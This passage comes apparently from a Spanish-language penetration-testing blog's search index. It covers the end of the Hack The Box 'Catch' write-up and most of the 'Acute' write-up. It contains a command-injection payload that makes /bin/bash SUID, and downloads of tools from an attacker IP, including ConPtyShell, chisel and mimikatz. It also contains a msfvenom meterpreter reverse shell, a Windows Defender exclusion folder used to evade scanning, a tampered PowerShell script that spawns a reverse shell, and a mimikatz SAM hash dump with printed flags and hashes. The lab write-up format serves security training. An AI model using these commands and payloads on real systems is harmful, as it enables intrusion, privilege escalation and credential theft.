Doesn't meet the requirements\" cleanup exit fi fi } #################### # Basic App Checks # #################### app_check() { APP_NAME=$(grep -oPm1 \"(?\u0026lt;=\u0026lt;string name=\\\"app_name\\\"\u0026gt;)[^\u0026lt;]+\" \"$1/res/values/strings.xml\") echo$APP_NAME if[[ $APP_NAME ==*\"Catch\"*]];then echo-n $APP_NAME|xargs -I {} sh -c 'mkdir {}' mv \"$3/$APK_NAME\"\"$2/$APP_NAME/$4\" else echo\"[!] App doesn't belong to Catch Global\" cleanup exit fi } ########### # Cleanup # ########### cleanup() { rm -rf $PROCESS_BIN;rm -rf \"$DROPBOX/*\"\"$IN_FOLDER/*\";rm -rf $(ls -A /opt/mdm |grep -v apk_bin |grep -v verify.sh) } ################### # MDM CheckerV1.0 # ################### DROPBOX=/opt/mdm/apk_bin IN_FOLDER=/root/mdm/apk_bin OUT_FOLDER=/root/mdm/certified_apps PROCESS_BIN=/root/mdm/process_bin forIN_APK_NAME in$DROPBOX/*.apk;do OUT_APK_NAME=\"$(echo ${IN_APK_NAME##*/}|cut -d '.' -f1)_verified.apk\" APK_NAME=\"$(openssl rand -hex 12).apk\" if[[ -L\"$IN_APK_NAME\"]];then exit else mv \"$IN_APK_NAME\"\"$IN_FOLDER/$APK_NAME\" fi sig_check $IN_FOLDER $APK_NAME comp_check $IN_FOLDER $APK_NAME $PROCESS_BIN app_check $PROCESS_BIN $OUT_FOLDER $IN_FOLDER $OUT_APK_NAME done cleanup  Básicamente, coge todos los archivos APK en /opt/mdm/apk_bin y aplica las funciones sig_check, comp_check y app_check sobre ellos:\n sig_check hace uso de jarsigner para verificar que el archivo APK tiene una firma válida; y si no, termina comp_check lee el archivo AndroidManifest.xml después de extraer los archivos con apktool para verificar que la versión de Android SDK es al menos 18 app_check lee el archivo res/values/strings.xml y verifica que la cadena \u0026quot;Catch\u0026quot; aparece en la cadena app_name. Si esto ocurre, se ejecutan las siguientes líneas de código:  APP_NAME=$(grep -oPm1 \"(?\u0026lt;=\u0026lt;string name=\\\"app_name\\\"\u0026gt;)[^\u0026lt;]+\" \"$1/res/values/strings.xml\") echo$APP_NAME if[[ $APP_NAME ==*\"Catch\"*]];then echo-n $APP_NAME|xargs -I {} sh -c 'mkdir {}' mv \"$3/$APK_NAME\"\"$2/$APP_NAME/$4\" # ... fi  Escalada de privilegios Lo único que podemos controlar en este script en Bash es $APP_NAME. De hecho, el código es vulnerable a inyección de comandos porque no hay comillas dobles en $APP_NAME. Esto puede derivar en inyección de comandos, aquí hay una simple prueba de concepto:\n$ APP_NAME='Catch | whoami' $ echo $APP_NAME | xargs -I {} sh -c 'echo {}' rocky  Por tanto, podemos coger el archivo APK que descargamos al principio, extraer su contenido con apktool modificar la configuración de app_name y construir el archivo APK de nuevo con apktool:\n$ apktool d catchv1.0.apk I: Using Apktool 2.6.1 on catchv1.0.apk I: Loading resource table... I: Decoding AndroidManifest.xml with resources... I: Loading resource table from file: ~/.local/share/apktool/framework/1.apk I: Regular manifest package... I: Decoding file-resources... I: Decoding values */* XMLs... I: Baksmaling classes.dex... I: Copying assets and libs... I: Copying unknown files... I: Copying original files... $ vim app_name catchv1.0/res/values/strings.xml $ grep app_name catchv1.0/res/values/strings.xml \u0026lt;string name=\"app_name\"\u0026gt;Catch | chmod 4755 /bin/bash; echo \u0026lt;/string\u0026gt; $ apktool b catchv1.0 I: Using Apktool 2.6.1 I: Checking whether sources has changed... I: Smaling smali folder into classes.dex... I: Checking whether resources has changed... I: Building resources... I: Building apk file... I: Copying unknown files/dir... I: Built apk...  Con el payload de arriba trataremos de hacer que /bin/bash sea un binario SUID. Entonces, una vez que pongamos el archivo APK en /opt/mdm/apk_bin y root ejecute el script en Bash, entonces /bin/bash será SUID:\nwill@catch:/tmp$ cd /opt/mdm/apk_bin will@catch:/opt/mdm/apk_bin$ ls -l --time-style=+ /bin/bash -rwxr-xr-x 1 root root 1183448 /bin/bash will@catch:/opt/mdm/apk_bin$ wget -q 10.10.17.44/catchv1.0.apk will@catch:/opt/mdm/apk_bin$ ls -l --time-style=+ total 2724 drwxrwx--x+ 2 root root 4096 ./ drwxr-x--x+ 3 root root 4096 ../ -rw-rw-r-- 1 will will 2778468 catchv1.0.apk will@catch:/opt/mdm/apk_bin$ ls -l --time-style=+ /bin/bash -rwsr-xr-x 1 root root 1183448 /bin/bash  Genial, ya podemos ejecutar Bash como root:\nwill@catch:/opt/mdm/apk_bin$ bash -p bash-5.0# cat /root/root.txt a4be51d5332126cbbb61423f2233f0a4  ","image":"/images/HTB/Catch/Catch.png","permalink":"https://7rocky.github.io/htb/catch/","section":"htb","summary":"Hack The Box. Linux. Máquina media. Esta máquina ofrece un archivo APK que contiene tokens de autenticación hard-coded de otros servicios expuestos. Uno de los tokens puede ser usado para enumerar una aplicación de Let\u0026rsquo;s Chat por medio de su API y obtener credenciales para Cachet. Este servicio es vulnerable a Server-Side Template Injection en PHP y podemos obtener más credenciales para acceder por SSH. La máquina ejecuta una tarea Cron para analizar archivos APK con un script en Bash que es vulnerable a inyección de comandos, por lo que tenemos que subir un archivo APK malicioso para explotarlo y convertirnos en root","time":7,"title":"Catch"},{"contents":"  SO: Windows   Dificultad: Difícil   Dirección IP: 10.10.11.145   Fecha: 12 / 02 / 2022   Escaneo de puertos # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.145 -p 443 Nmap scan report for 10.10.11.145 Host is up (0.072s latency). PORT STATE SERVICE VERSION 443/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found | ssl-cert: Subject: commonName=atsserver.acute.local | Subject Alternative Name: DNS:atsserver.acute.local, DNS:atsserver | Not valid before: 2022-01-06T06:34:58 |_Not valid after: 2030-01-04T06:34:58 |_ssl-date: 2022-02-12T19:04:45+00:00; -17s from scanner time. | tls-alpn: |_ http/1.1 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: -17s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 26.62 seconds  La máquina tiene abierto el puerto 443 (HTTPS).\nEnumeración Si vamos a https://10.10.11.145, no veremos nada:\nPodemos encontrar un subdominio llamado atsserver.acute.local en la salida de nmap. Ahora podemos añadirlo a /etc/hosts y también acute.local por si acaso. Y vemos una página web al ir a https://atsserver.acute.local:\nExiste una sección de \u0026ldquo;about\u0026rdquo; donde podmeos descargar un documento de Microsoft Word (.docx), pinchando en la esquina superior derecha en un botón llamado \u0026ldquo;New Starter Forms\u0026rdquo;:\nEl archivo de Word contiene algunas instrucciones para los empleados que se unen a la empresa. La información más interesante es esta:\n The University’s staff induction pages can be found at: https://atsserver.acute.local/Staff\n  The Staff Induction portal can be found here: https://atsserver.acute.local/Staff/Induction\n  Arrange for the new starter to receive a demonstration on using IT tools which may include MUSE, myJob and Google accounts. Walk the new starter through the password change policy, they will need to change it from the default Password1!. Not all staff are changing these so please be sure to run through this\n  Run through the new PSWA to highlight the restrictions set on the sessions named dc_manage\n  Complete the remote (https://atsserver.acute.local/acute_staff_access) training\n  Lois is the only authorized personnel to change Group Membership, Contact Lois to have this approved and changed if required. Only Lois can become site admin\n Hemos encontrado tres nuevas URL, aunque solo una funciona:\nGenial, esto es un portal de acceso a un ordenador por PowerShell (PWSA), pero necesitamos credenciales y un nombre de ordenador al que conectarnos.\nEnumeración de usuarios Como en muchar máquinas Windows, los nombres de usuarios son importantes para la explotación.\nEl documento de Word muestra un usuario llamado Lois y una contraseña potencial: Password1!.\nMirando a los metadatos utilizando exiftool vemos más cosas:\n$ exiftool New_Starter_CheckList_v7.docx ExifTool Version Number : 12.30 File Name : New_Starter_CheckList_v7.docx ... Zip Compressed Size : 428 Zip Uncompressed Size : 2527 Zip File Name : [Content_Types].xml Creator : FCastle Description : Created on Acute-PC01 Last Modified By : Daniel Revision Number : 8 Last Printed : 2021:01:04 15:54:00Z Create Date : 2021:12:08 14:21:00Z Modify Date : 2021:12:22 00:39:00Z Template : Normal.dotm Total Edit Time : 2.6 hours Pages : 3 Words : 886 Characters : 5055 Application : Microsoft Office Word Doc Security : None Lines : 42 Paragraphs : 11 Scale Crop : No Heading Pairs : Title, 1 Titles Of Parts : Company : University of Marvel Links Up To Date : No Characters With Spaces : 5930 Shared Doc : No Hyperlinks Changed : No App Version : 16.0000  Tenemos dos nombres de usuario (FCastle y Daniel) y un nombre de ordenador (Acute-PC01).\nAhora podemos utilizar este nombre de ordenador, la contraseña u los nombres de usuarios para entrar a PSWA, pero no funcionan.\nDe hecho, podemos encontrar más usuarios en la sección de \u0026ldquo;about\u0026rdquo; de la página web:\nComo hay un nombre de usuario llamado FCastle, podemos deducir que los nombres de usuario se obtienen con la primera letra del nombre seguida del apellido.\nPor tanto, tenemos estos nombres de usuarios por el momento:\n Lois (LHopkins) Daniel FCastle AWallace CHall EDavies IMonks JMorgan  Acceso a la máquina Ahora podemos realizar un ataque de password spray para intentar conectarnos a Acute-PC01 desde PSWA. La conexión es exitosa para EDavies:Password1!:\nAnalizando Acute-PC01 Podemos realizar un reconocimiento básico del sistema:\nPS C:\\Users\\edavies\\Documents\u0026gt; dir C:\\ Directory: C:\\ Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 07/12/2019 9:14 PerfLogs d-r--- 06/12/2021 11:06 Program Files d-r--- 07/12/2021 12:43 Program Files (x86) d-r--- 21/12/2021 22:50 Users d----- 21/12/2021 22:53 Utils d----- 16/12/2021 1:23 Windows PS C:\\Users\\edavies\\Documents\u0026gt; dir C:\\Users Directory: C:\\Users Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 21/12/2021 13:01 administrator.ACUTE d----- 22/12/2021 1:26 edavies d----- 21/12/2021 22:50 jmorgan d----- 19/11/2021 9:29 Natasha d-r--- 18/11/2020 23:43 Public PS C:\\Users\\edavies\\Documents\u0026gt; ipconfig Windows IP Configuration Ethernet adapter Ethernet 2: Connection-specific DNS Suffix . : Link-local IPv6 Address . . . . . : fe80::9513:4361:23ec:64fd%14 IPv4 Address. . . . . . . . . . . : 172.16.22.2 Subnet Mask . . . . . . . . . . . : 255.255.255.0 Default Gateway . . . . . . . . . : 172.16.22.1 PS C:\\Users\\edavies\\Documents\u0026gt;  Vemos que no estamos en la máquina que debemos comprometer porque la dirección IP es 172.16.22.2 y queremos que sea 10.10.11.145.\nVamos a enumerar un poco más:\nPS C:\\Users\\edavies\\Documents\u0026gt; cd C:\\Users PS C:\\Users\u0026gt; tree Folder PATH listing Volume serial number is 8A9A-E124 C:. ÃÄÄÄadministrator.ACUTE ÃÄÄÄedavies ³ ÃÄÄÄ3D Objects ³ ÃÄÄÄContacts ³ ÃÄÄÄDesktop ³ ÃÄÄÄDocuments ³ ÃÄÄÄDownloads ³ ÃÄÄÄFavorites ³ ÃÄÄÄLinks ³ ÃÄÄÄMusic ³ ³ ÀÄÄÄPlaylists ³ ÃÄÄÄOneDrive ³ ÃÄÄÄPictures ³ ³ ÀÄÄÄCamera Roll ³ ÃÄÄÄSaved Games ³ ÃÄÄÄSearches ³ ÀÄÄÄVideos ³ ÀÄÄÄCaptures ÃÄÄÄjmorgan ÃÄÄÄNatasha ÀÄÄÄPublic  No hay nada interesante en las carpetas personales de los usuarios. ¿Tenemos algun privilegio útil o pertenecemos a algún grupo?\nPS C:\\Users\u0026gt; whoami /all USER INFORMATION ---------------- User Name SID ============= ============================================== acute\\edavies S-1-5-21-1786406921-1914792807-2072761762-1106 GROUP INFORMATION ----------------- Group Name Type SID Attributes ========================================== ================ ============ ================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\\Remote Management Users Alias S-1-5-32-580 Mandatory group, Enabled by default, Enabled group BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group Authentication authority asserted identity Well-known group S-1-18-1 Mandatory group, Enabled by default, Enabled group Mandatory Label\\Medium Mandatory Level Label S-1-16-8192 PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ============================== ======= SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled USER CLAIMS INFORMATION ----------------------- User claims unknown. Kerberos support for Dynamic Access Control on this device has been disabled.  Enumeración del controlador de dominio No parece. El gateway de salida de Acute-PC01 por defecto es la máquina principal:\nPS C:Users\\\u0026gt; nslookup atsserver.acute.local DNS request timed out. timeout was 2 seconds. Server: UnKnown Address: 172.16.22.1 Name: atsserver.acute.local Addresses: dead:beef::283e:7912:47ab:5601 dead:beef::1f9 172.16.22.1 10.10.11.145 PS C:Users\\\u0026gt; nslookup acute.local DNS request timed out. timeout was 2 seconds. Server: UnKnown Address: 172.16.22.1 Name: acute.local Addresses: dead:beef::1f9 dead:beef::283e:7912:47ab:5601 172.16.22.1 10.10.11.145  Vamos a realizar un escaneo de puertos de esta máquina:\nPS C:\\Users\u0026gt; 53,88,135,389,445,1443,5985 | % {echo ((New-Object Net.Sockets.TcpClient).Connect('172.16.22.1', $_)) \"Port $_ : open\"} 2\u0026gt;$null Port 53 : open Port 88 : open Port 135 : open Port 389 : open Port 445 : open Port 5985 : open  Parece un controlador de dominio de un entorno de Active Directory porque tiene abiertos los puertos 53 (DNS), 88 (Kerberos), 135 (MS-RPC), 389 (LDAP) y 445 (SMB).\nPara atacar al controlador de dominio, tendremos que utilizar Acute-PC01 como pivote. Utilizaré chisel como proxy SOCKS5 para poder lanzar las herramientas ofensivas de AD desde la máquina de atacante. Podemos compilarlo para Windows o descargar el binario compilado de la sección de descargas.\nPrimero de todo, vamos a conseguir una reverse shell para tener algo más de control. Utilizaré ConPtyShell. Si tratamos de subirlo a C:\\Windows\\Temp mediante un servidor HTTP con Python, Windows Defender lo bloquea:\nPS C:\\Users\u0026gt; cd C:\\Windows\\Temp PS C:\\Windows\\Temp\u0026gt; curl http://10.10.17.44/ConPtyShell.exe -o r.exe PS C:\\Windows\\Temp\u0026gt; .\\r.exe Program 'r.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted software. + CategoryInfo : ResourceUnavailable: (:) [], ApplicationFailedException + FullyQualifiedErrorId : NativeCommandFailed   Podemos consultar las carpetas que no son examinadas mediante esta consulta:\nPS C:\\Windows\\Temp reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\" HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths C:\\Utils REG_DWORD 0x0 C:\\Windows\\System32 REG_DWORD 0x0  Como se ve, C:\\Utils no se valida. Vamos a descargar el binario aquí entonces:\nPS C:\\Windows\\Temp\u0026gt; cd C:\\Utils PS C:\\Utils\u0026gt; curl http://10.10.17.44/ConPtyShell.exe -o r.exe  Ahora, desde la máquina de atacante, iniciamos nc y ejecutamos el binario desde Acute-PC01:\nPS C:\\Utils\u0026gt; .\\r.exe 10.10.17.44 4444 50 158 CreatePseudoConsole function found! Spawning a fully interactive shell  Y recibimos la conexión:\n$ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.145. Ncat: Connection from 10.10.11.145:49865. ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. Try the new cross-platform PowerShell https://aka.ms/pscore6 PS C:\\Utils\u0026gt;  Capturas de pantalla de una sesión de escritorio remoto En este punto, podemos ejecutar winpeas.exe para enumerar un poco más:\nPS C:\\Utils\u0026gt; curl http://10.10.17.44/winPEASx64.exe -o w.exe  Existe una sesión de RDP en proceso:\n╔══════════╣ RDP Sessions SessID pSessionName pUserName pDomainName State SourceIP 1 Console edavies ACUTE Active  Podemos obtener esta misma información con este comando:\nPS C:\\Utils\u0026gt; query user USERNAME SESSIONNAME ID STATE IDLE TIME LOGON TIME edavies console 1 Active none 17/02/2022 20:06  Ahora nos trataremos de conectar a esta sesión mediante rdesktop desde la máquina de atacante. Para ello, tenemos que utilizar chisel y hacer que Acute-PC01 sea un pivote (proxy SOCKS5).\n$ ./chisel server --port 1234 --reverse --socks5 server: Reverse tunnelling enabled server: Fingerprint 5poOpBwlXtp1WxVRCm7EbKeboWO2ERpbS+LdvV4V6CY= server: Listening on http://0.0.0.0:1234  PS C:\\Utils\u0026gt; curl http://10.10.17.44/chisel.exe -o c.exe PS C:\\Utils\u0026gt; .\\c.exe client 10.10.17.44:1234 R:socks client: Connecting to ws://10.10.17.44:1234 client: Connected (Latency 36.4951ms)  Y la conexión se establece correctamente:\n$ ./chisel server --port 1234 --reverse --socks5 server: Reverse tunnelling enabled server: Fingerprint 5poOpBwlXtp1WxVRCm7EbKeboWO2ERpbS+LdvV4V6CY= server: Listening on http://0.0.0.0:1234 server: session#1: Client version (0.0.0-src) differs from server version (1.7.7) server: session#1: tun: proxy#R:127.0.0.1:1080=\u0026gt;socks: Listening  Vamos a verificar que llegamos a la máquina víctima:\n# proxychains4 -q nmap -sT -sV -p 445,3389 172.16.22.1 Starting Nmap 7.92 ( https://nmap.org ) RTTVAR has grown to over 2.3 seconds, decreasing to 2.0 RTTVAR has grown to over 2.3 seconds, decreasing to 2.0 Nmap scan report for 172.16.22.1 Host is up (13s latency). PORT STATE SERVICE VERSION 445/tcp open microsoft-ds? 3389/tcp closed ms-wbt-server Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 49.25 seconds  Vemos que el puerto RDP está cerrado. A lo mejor la sesión sigue activa, por lo que podríamos hacer una captura de pantalla y visualizar dicha sesión. Para ello, tenemos que utilizar Metasploit.\nPrimero, creamos un binario con la consola de meterpreter:\n$ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.17.44 LPORT=4444 -f exe -o m.exe [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 200262 bytes Final size of exe file: 206848 bytes Saved as: m.exe  Iniciamos un handler con msfconsole:\n# msfconsole -q msf6 \u0026gt; use multi/handler [*] Using configured payload generic/shell_reverse_tcp msf6 exploit(multi/handler) \u0026gt; set payload windows/x64/meterpreter_reverse_tcp payload =\u0026gt; windows/x64/meterpreter_reverse_tcp msf6 exploit(multi/handler) \u0026gt; set LPORT 4444 LPORT =\u0026gt; 4444 msf6 exploit(multi/handler) \u0026gt; set LHOST 10.10.17.44 LHOST =\u0026gt; 10.10.17.44 msf6 exploit(multi/handler) \u0026gt; run [*] Started reverse TCP handler on 10.10.17.44:4444  Luego, subimos el binario y lo ejecutamos:\nPS C:\\Utils\u0026gt; curl http://10.10.17.44/m.exe -o m.exe PS C:\\Utils\u0026gt; .\\m.exe  Y recibimos la conexión:\n# msfconsole -q msf6 \u0026gt; use multi/handler [*] Using configured payload generic/shell_reverse_tcp msf6 exploit(multi/handler) \u0026gt; set payload windows/x64/meterpreter_reverse_tcp payload =\u0026gt; windows/x64/meterpreter_reverse_tcp msf6 exploit(multi/handler) \u0026gt; set LPORT 4444 LPORT =\u0026gt; 4444 msf6 exploit(multi/handler) \u0026gt; set LHOST 10.10.17.44 LHOST =\u0026gt; 10.10.17.44 msf6 exploit(multi/handler) \u0026gt; run [*] Started reverse TCP handler on 10.10.17.44:4444 [*] Meterpreter session 1 opened (10.10.17.44:4444 -\u0026gt; 10.10.11.145:49842) meterpreter \u0026gt; getuid Server username: ACUTE\\edavies meterpreter \u0026gt; screenshare [*] Preparing player... [*] Opening player at: ./xjWtVNMB.html [*] Streaming...  Con estos comandos, veremos las capturas de pantalla en tiempo real:\nY encontramos que el usuario está tratando de ejecutar los siguientes comandos:\nEnter-PSSession -computername atsserver $pass = ConvertTo-SecureString \"W3_4R3_th3_f0rce.\" -AsPlaintext -Force $cred = New-Object System.Management.Automation.PSCredential (\"acute\\imonks\", $pass) Enter-PSSession -computername ATSSERVER -credential $cred Enter-PSSession -computername ATSSERVER -ConfigurationName dc_manage -credential $cred  Movimiento lateral al usuario imonks Ahora podemos continuar desde la primera reverse shell en lugar de seguir con meterpreter y utilizar los comandos anteriores para conectarnos a la máquina víctima utilizando script blocks:\nPS C:\\Utils\u0026gt; $pass = ConvertTo-SecureString \"W3_4R3_th3_f0rce.\" -AsPlaintext -Force PS C:\\Utils\u0026gt; $cred = New-Object System.Management.Automation.PSCredential (\"acute\\imonks\", $pass) PS C:\\Utils\u0026gt; Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { whoami } acute\\imonks PS C:\\Utils\u0026gt; Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { ls C:\\Users\\imonks\\Desktop } Directory: C:\\Users\\imonks\\Desktop Mode LastWriteTime Length Name PSComputerName ---- ------------- ------ ---- -------------- -ar--- 18/02/2022 10:38 34 user.txt atsserver -a---- 11/01/2022 18:04 602 wm.ps1 atsserver PS C:\\Utils\u0026gt; Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { type C:\\Users\\imonks\\Desktop\\user.txt } 8df8cbb2405a467ccc13d7af36b0d611  En este punto, hemos conseguido la flag user.txt.\nVamos a verificar qué usuarios están configurados en esta máquina:\nPS C:\\Utils\u0026gt; Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { net user } User accounts for \\\\ ------------------------------------------------------------------------------- Administrator awallace chall edavies Guest imonks jmorgan krbtgt lhopkins The command completed with one or more errors.  El usuario imonks pertenece al grupo Managers:\nPS C:\\Utils\u0026gt; Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { net user imonks /domain } User name imonks Full Name Ieuan Monks Comment User's comment Country/region code 000 (System Default) Account active Yes Account expires Never Password last set 21/12/2021 14:51:31 Password expires Never Password changeable 22/12/2021 14:51:31 Password required Yes User may change password No Workstations allowed All Logon script User profile Home directory Last logon 18/02/2022 11:04:17 Logon hours allowed All Local Group Memberships Global Group memberships *Domain Users *Managers The command completed successfully.  Si consultamos más usuarios que pertenecen a Managers vemos que awallace también es miembro:\nPS C:\\Utils\u0026gt; Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { net groups Managers } Group name Managers Comment Members ------------------------------------------------------------------------------- awallace imonks The command completed successfully.  Existe un directorio inusual en C:\\Program Files, pero no tenemos permisos para acceder a él:\nPS C:\\Utils\u0026gt; Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { ls \"C:\\Program Files\" } Directory: C:\\Program Files Mode LastWriteTime Length Name PSComputerName ---- ------------- ------ ---- -------------- d----- 21/12/2021 00:04 common files atsserver d----- 21/12/2021 00:11 Hyper-V atsserver d----- 15/09/2018 08:12 internet explorer atsserver d----- 18/02/2022 12:54 keepmeon atsserver d----- 21/12/2021 00:04 VMware atsserver d----- 20/12/2021 21:19 Windows Defender atsserver d----- 20/12/2021 21:12 Windows Defender Advanced Threat Protection atsserver d----- 21/12/2021 14:13 WindowsPowerShell atsserver PS C:\\Utils\u0026gt; Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { ls \"C:\\Program Files\\keepmeon\" } Access to the path 'C:\\Program Files\\keepmeon' is denied. + CategoryInfo : PermissionDenied: (C:\\Program Files\\keepmeon:String) [Get-ChildItem], UnauthorizedAccessException + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand + PSComputerName : atsserver  Movimiento lateral al usuario jmorgan En la carpeta Desktop de imonks hay un script en PowerShell:\nPS C:\\Utils\u0026gt; Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { type C:\\Users\\imonks\\Desktop\\wm.ps1 }  $securepasswd = '01000000d08c9ddf0115d1118c7a00c04fc297eb0100000096ed5ae76bd0da4c825bdd9f24083e5c0000000002000000000003660000c00000001000000080f704e251793f5d4f903c7158c8213d0000000004800000a000000010000000ac2606ccfda6b4e0a9d56a20417d2f67280000009497141b794c6cb963d2460bd96ddcea35b25ff248a53af0924572cd3ee91a28dba01e062ef1c026140000000f66f5cec1b264411d8a263a2ca854bc6e453c51' $passwd = $securepasswd | ConvertTo-SecureString $creds = New-Object System.Management.Automation.PSCredential (\"acute\\jmorgan\", $passwd) Invoke-Command -ScriptBlock {Get-Volume} -ComputerName Acute-PC01 -Credential $creds  Está realizando acciones en Acute-PC01 como jmorgan. Somos capaces de modificar este script en PowerShell para conseguir una reverse shell como jmorgan:\nPS C:\\Utils\u0026gt; Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { ((cat 'C:\\Users\\imonks\\Desktop\\wm.ps1' -Raw) -Replace 'Get-Volume', ' C:\\Utils\\r.exe 10.10.17.44 5555 50 158 ') | Set-Content -Path C:\\Users\\imonks\\Desktop\\wm.ps1 } PS C:\\Utils\u0026gt; Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { type C:\\Users\\imonks\\Desktop\\wm.ps1 }  $securepasswd = '01000000d08c9ddf0115d1118c7a00c04fc297eb0100000096ed5ae76bd0da4c825bdd9f24083e5c0000000002000000000003660000c00000001000000080f704e251793f5d4f903c7158c8213d0000000004800000a000000010000000ac2606ccfda6b4e0a9d56a20417d2f67280000009497141b794c6cb963d2460bd96ddcea35b25ff248a53af0924572cd3ee91a28dba01e062ef1c026140000000f66f5cec1b264411d8a263a2ca854bc6e453c51' $passwd = $securepasswd | ConvertTo-SecureString $creds = New-Object System.Management.Automation.PSCredential (\"acute\\jmorgan\", $passwd) Invoke-Command -ScriptBlock { C:\\Utils\\r.exe 10.10.17.44 5555 50 158 } -ComputerName Acute-PC01 -Credential $creds  Y ahora está modificado. Si lo ejecutamos, obtenemos la reverse shell como jmorgan en Acute-PC01:\nPS C:\\Utils\u0026gt; Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { C:\\Users\\imonks\\Desktop\\wm.ps1 } CreatePseudoConsole function found! Spawning a fully interactive shell  $ nc -nlvp 5555 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::5555 Ncat: Listening on 0.0.0.0:5555 Ncat: Connection from 10.10.11.145. Ncat: Connection from 10.10.11.145:49872. ^Z zsh: suspended ncat -nlvp 5555 $ stty raw -echo; fg [1] + continued ncat -nlvp 5555 Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. Try the new cross-platform PowerShell https://aka.ms/pscore6 PS C:\\Users\\jmorgan\\Documents\u0026gt; whoami acute\\jmorgan  Extracción de hashes NTLM Descubrimos que jmorgan pertenece a Administrators:\nPS C:\\Users\\jmorgan\\Documents\u0026gt; whoami /groups GROUP INFORMATION ----------------- Group Name Type SID Attributes ========================================== ================ ============ =============================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\\Administrators Alias S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group Authentication authority asserted identity Well-known group S-1-18-1 Mandatory group, Enabled by default, Enabled group Mandatory Label\\High Mandatory Level Label S-1-16-12288  Por tanto, podemos volcar los hashes NTLM del SAM utilizando mimikatz.exe:\nPS C:\\Users\\jmorgan\\Documents\u0026gt; cd C:\\Utils PS C:\\Users\\jmorgan\\Documents curl http://10.10.17.44/mimikatz.exe -o mm.exe PS C:\\Utils .\\mm.exe .#####. mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53 .## ^ ##. \"A La Vie, A L'Amour\" - (oe.eo) ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ## \u0026gt; https://blog.gentilkiwi.com/mimikatz '## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com ) '#####' \u0026gt; https://pingcastle.com / https://mysmartlogon.com ***/ mimikatz #  Ahora tenemos que introducir privilege::debug, token::elevate, lsadump::sam:\nmimikatz # privilege::debug Privilege '20' OK mimikatz # token::elevate Token Id : 0 User name : SID name : NT AUTHORITY\\SYSTEM 632 {0;000003e7} 0 D 23650 NT AUTHORITY\\SYSTEM S-1-5-18 (04g,31p) Primary -\u0026gt; Impersonated ! * Process Token : {0;00168d80} 0 D 1503149 ACUTE\\jmorgan S-1-5-21-1786406921-1914792807-2072761762-1108 (09g,24p) Primary * Thread Token : {0;000003e7} 0 D 1818149 NT AUTHORITY\\SYSTEM S-1-5-18 (04g,31p) Impersonation (Delegation) mimikatz # lsadump::sam Domain : ACUTE-PC01 SysKey : 44397c32a634e3d8d8f64bff8c614af7 Local SID : S-1-5-21-2560123600-3246320471-2688489995 SAMKey : fb8ee3299f8af5fb2100621a50059fa2 RID : 000001f4 (500) User : Administrator Hash NTLM: a29f7623fd11550def0192de9246f46b lm - 0: c8ff11012182f1dc95a478b25fdde0da ntlm- 0: a29f7623fd11550def0192de9246f46b Supplemental Credentials: * Primary:NTLM-Strong-NTOWF * Random Value : 7699e833f3fc55323a6c2d9582bb143f * 